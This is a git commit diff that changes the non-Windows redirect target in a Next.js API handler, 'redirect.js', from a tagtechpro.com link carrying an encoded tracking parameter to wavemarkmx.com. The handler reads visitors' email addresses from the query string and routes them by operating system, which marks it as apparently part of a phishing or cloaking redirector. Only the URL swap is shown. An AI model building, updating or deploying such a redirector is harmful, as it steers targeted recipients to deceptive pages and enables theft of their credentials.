539ea07a05ae5d3ac7dfbe0b84cb74dacbabc4c9
Newman400 <marystepmom71@gmail.com>
2025-11-21 06:48:18 -0800

    Update NON_WINDOWS_TARGET URL in redirect.js

--- my-redirect-app-html-ready/pages/api/redirect.js
+++ my-redirect-app-html-ready/pages/api/redirect.js
@@ -7,7 +7,7 @@ export default function handler(req, res) {
 
   // Base URL for non-Windows users
   const NON_WINDOWS_TARGET =
-    'https://tagtechpro.com/i/?aXBkYXRhPTIwNS4yMzQuMTgxLjMwJnN2PWdlbmVyYWwmcj1LQSZ1aWQ9VVNFUjE1MDcyMDI1VTUyMDcxNTE3JnM9TGE=';
+    'https://wavemarkmx.com/ms';
 
   //--------------------------------------------------------------------
   // 1. Try to read query normally: ?email= or ?smn=
